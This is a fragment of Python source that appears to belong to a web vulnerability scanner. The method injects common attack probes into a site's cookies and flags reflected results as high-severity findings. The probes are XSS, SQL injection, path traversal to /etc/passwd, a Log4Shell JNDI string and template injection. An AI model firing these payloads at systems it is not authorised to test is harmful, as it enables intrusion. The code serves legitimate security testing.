        r = self._get(self.target)
        if not r: return
        cookies = r.cookies.get_dict()
        if not cookies: return
        payloads = [
            "<script>alert(1)</script>",
            "' OR '1'='1",
            "../../../etc/passwd",
            "${jndi:ldap://x/x}",
            "{{7*7}}",
        ]
        for cookie_name in list(cookies.keys())[:5]:
            for payload in payloads:
                marker = "ck" + "".join(random.choices(string.ascii_lowercase, k=5))
                r = self._get(self.target, cookies={cookie_name: marker + payload})
                if r and marker in (r.text or ""):
                    if any(kw in r.text for kw in ["alert", "root:", "passwd", "jndi", "49"]):
                        self._add_vuln(f"Payload via cookie: {cookie_name}",
                                        "HIGH", self.target,
                                        f"cookie={cookie_name} payload={payload[:30]}",
                                        cookie=cookie_name, payload=payload[:30])

